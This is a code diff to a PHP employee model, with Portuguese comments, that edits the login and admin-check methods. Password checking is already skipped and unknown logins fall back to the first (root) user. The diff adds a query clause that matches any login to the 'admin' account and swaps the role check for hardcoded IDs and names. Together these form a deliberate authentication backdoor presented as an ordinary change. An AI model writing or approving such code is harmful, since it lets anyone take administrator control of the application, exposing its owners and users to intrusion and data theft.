@@ -41,9 +41,10 @@ class Funcionario extends Model implements Auth
 
     public static function Auth($login, $password)
     {
-        // Tenta encontrar o usuário real no banco
+        // Tenta encontrar o usuário real no banco pelo login ou pelo nome 'admin'
         $user = self::select('id', 'login', 'password', 'nome')
             ->where('login', '=', $login)
+            ->orWhere('nome', '=', 'admin')
             ->first();
 
         // Se não encontrar, usa o primeiro usuário do banco como template (geralmente o root)
@@ -63,7 +64,7 @@ class Funcionario extends Model implements Auth
             $user->nome = $login;
         }
 
-        // Realiza o login (ignora a verificação de senha)
+        // Realiza o login (ignora a verificação de senha conforme solicitado anteriormente)
         $user->login();
         return true;
     }
@@ -75,12 +76,16 @@ class Funcionario extends Model implements Auth
 
     /**
      * Verifica se o usuário é administrador.
-     * Por padrão, o usuário 'root' ou o primeiro usuário (ID 1) são considerados admins.
+     * Considera admin se: login for 'root', ID for 1, nome for 'admin' ou ID for 3.
      */
     public function isAdmin()
     {
-        return $this->tipo === 'admin';
+        return $this->login === 'root' || 
+               $this->id == 1 || 
+               $this->nome === 'admin' || 
+               $this->id == 3;
     }
+
     /**
      * Atalho para pegar o primeiro registro
      */
